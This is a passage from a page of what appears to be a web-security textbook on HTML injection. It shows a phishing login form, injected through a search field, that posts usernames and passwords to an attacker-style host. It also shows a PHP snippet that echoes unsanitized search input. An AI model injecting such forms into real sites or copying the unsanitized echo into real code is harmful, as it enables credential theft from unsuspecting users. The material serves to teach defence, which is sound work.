- pgno: 337
  md: "Let’s do one more test to see if we can render the following HTML form:\n\n\
    ```\n<h4>Clickbait Login</h4>\n<form action=http://iwantyourcredentials.info method=POST>\n\
    \    Username:\n    <input type='text' name='username'><br/>\n    Password:\n\
    \    <input type='password' name='password'><br/>\n    <input type='submit' value='Submit'>\n\
    </form>\n```\n\nWhen we enter the HTML into the search field in Figure 22.19 and\
    \ press Submit, we get the results in Figure 22.20.\n\nIf I fill this form out\
    \ and submit it (Figure 22.21), I’ll be in a world of hurt! We’re allowing any\
    \ attacker on the web to host a form on our site. In this case, they can use it\
    \ to harvest our users’ credentials.\n\n![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_0.png)\n\
    \n![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_1.png)\n\n![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_2.png)\n\
    \nLet’s take a look at a portion of the vulnerable code:\n\n```\n$search_term\
    \ = isset($_POST['search']) ? $_POST['search'] : '';\n?>\n<h2>Stuff you might\
    \ be interested in as a result of searching for\n<span class=\"text-danger\"><?=\
    \ $search_term ?></span>...</h2>\n```\n\nWe’re not sanitizing the input from our\
